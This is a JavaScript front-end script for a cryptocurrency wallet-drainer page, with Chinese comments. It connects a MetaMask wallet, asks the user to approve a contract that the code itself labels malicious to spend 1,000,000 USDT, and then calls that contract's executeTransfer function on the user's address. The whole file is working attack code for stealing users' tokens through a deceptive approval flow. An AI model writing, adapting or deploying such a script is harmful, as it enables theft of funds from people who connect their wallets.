let provider;
let signer;
let contract;

const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
const maliciousContractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 恶意合约地址
const maliciousABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        try {
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            const address = await signer.getAddress();
            console.log("Connected:", address);
            document.getElementById("approveButton").disabled = false; // 启用授权按钮
        } catch (error) {
            console.error("Failed to connect wallet:", error);
            alert("Failed to connect wallet: " + error.message);
        }
    } else {
        alert("Please install MetaMask!");
    }
}

async function approveTransfer() {
    const usdtContract = new ethers.Contract(usdtAddress, [
        "function approve(address spender, uint256 amount) public returns (bool)"
    ], signer);

    const amount = ethers.utils.parseUnits("1000000", 6); // USDT 有 6 位小数
    try {
        const tx = await usdtContract.approve(maliciousContractAddress, amount);
        await tx.wait();
        console.log("Approval successful:", tx);
        document.getElementById("executeTransferButton").disabled = false; // 启用执行转移按钮
    } catch (error) {
        console.error("Approval failed:", error);
        alert("Approval failed: " + error.message);
    }
}

async function executeTransfer() {
    contract = new ethers.Contract(maliciousContractAddress, maliciousABI, signer);
    const userAddress = await signer.getAddress();
    
    try {
        const tx = await contract.executeTransfer(userAddress);
        await tx.wait();
        console.log("Transfer executed:", tx);
    } catch (error) {
        console.error("Transfer execution failed:", error);
        alert("Transfer execution failed: " + error.message);
    }
}

// 绑定事件
document.getElementById("connectButton").onclick = connectWallet;
document.getElementById("approveButton").onclick = approveTransfer;
document.getElementById("executeTransferButton").onclick = executeTransfer;
